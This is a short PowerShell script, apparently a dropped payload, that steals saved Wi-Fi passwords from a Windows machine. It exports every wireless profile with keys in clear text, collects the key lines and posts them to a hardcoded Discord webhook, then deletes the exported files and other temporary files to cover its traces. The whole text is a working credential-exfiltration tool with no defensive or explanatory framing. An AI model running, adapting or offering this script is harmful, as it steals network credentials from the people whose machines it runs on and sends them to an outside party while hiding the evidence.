cd $env:TEMP
netsh wlan export profile key=clear
dir Wi*.xml
Select-String -Path Wi*.xml -Pattern 'keyMaterial' | Out-File -FilePath "Wi-Fi-PASS.txt"
dir Wi-Fi-PASS.txt
$fileContent = Get-Content "Wi-Fi-PASS.txt" -Raw
if ($fileContent) {
    Invoke-WebRequest -Uri 'https://discord.com/api/webhooks/1247670860190584884/G7SdYHwgibfF6KCvNWg1-3ldcmI3WgGIMeOraABtjTK8SCmMBNu_1S09sLQi2nwmuzGD' -Method POST -Body @{content=$fileContent}
} else {
    echo 'No data to send'
}
# Clean up Wi-Fi pass files
del Wi-* /s /f /q

# Clean up other temporary files
Remove-Item -Path "$env:TEMP\Test-F0-1.0.zip" -Force -ErrorAction SilentlyContinue
Remove-Item -Path "$env:TEMP\Test-F0-1.0" -Recurse -Force -ErrorAction SilentlyContinue

exit
